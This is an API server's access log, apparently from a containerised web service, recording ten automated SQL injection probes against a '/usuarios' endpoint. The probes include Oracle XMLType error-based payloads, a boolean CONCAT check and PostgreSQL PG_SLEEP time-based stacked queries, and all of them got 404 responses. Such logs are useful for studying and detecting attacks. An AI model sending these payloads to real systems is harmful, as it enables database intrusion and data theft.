api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:60280 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/1716%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281716%3D1716%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%288034%3D8034 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60298 - "GET /usuarios/%2A%2A/AND/%2A%2A/1716%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281716%3D1716%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60284 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/1716%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281716%3D1716%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%28%27lNZh%27%3D%27lNZh HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60312 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/1716%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281716%3D1716%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%27EGRz%27%3D%27EGRz HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60320 - "GET /usuarios/%2A%2A/AND/%2A%2A/1716%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281716%3D1716%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29--/%2A%2A/CLrR HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60328 - "GET /%28SELECT/%2A%2A/CONCAT%28CONCAT%28%27qvkjq%27%2C%28CASE/%2A%2A/WHEN/%2A%2A/%288812%3D8812%29/%2A%2A/THEN/%2A%2A/%271%27/%2A%2A/ELSE/%2A%2A/%270%27/%2A%2A/END%29%29%2C%27qkkbq%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60330 - "GET /usuarios%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60338 - "GET /usuarios%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60350 - "GET /usuarios%27%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60352 - "GET /usuarios%27%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
